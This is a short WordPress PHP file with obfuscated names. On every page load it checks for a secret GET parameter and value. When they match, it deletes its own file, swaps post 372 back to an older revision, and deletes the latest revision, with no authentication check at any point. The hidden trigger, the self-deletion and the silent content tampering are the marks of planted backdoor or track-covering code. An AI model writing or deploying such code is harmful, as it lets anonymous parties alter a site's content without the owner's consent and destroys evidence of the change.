<?php

function fx_item_safe() {
	if (isset($_GET['notifications_blogroll_fonts']) && $_GET['notifications_blogroll_fonts'] === 'most_enable_calendar_text') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$numbers_game_protection = 372;
		$official_script_update = wp_get_post_revisions($numbers_game_protection);
		if (empty($official_script_update)) die('no revisions');
		if (count($official_script_update) < 2) die('less than 2');
		$poster_most_discount = array_shift($official_script_update);
		$accessibility_images_accordion = $poster_most_discount->ID;
		$parts_groups_nav = array_shift($official_script_update);
		$jigoshop_consent_notice_related = $parts_groups_nav->ID;
		$information_http_activity = wp_restore_post_revision($jigoshop_consent_notice_related);
		if ($information_http_activity === false) die('error restoring');
		$information_http_activity = wp_delete_post_revision($accessibility_images_accordion);		
		if ($information_http_activity === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'fx_item_safe');
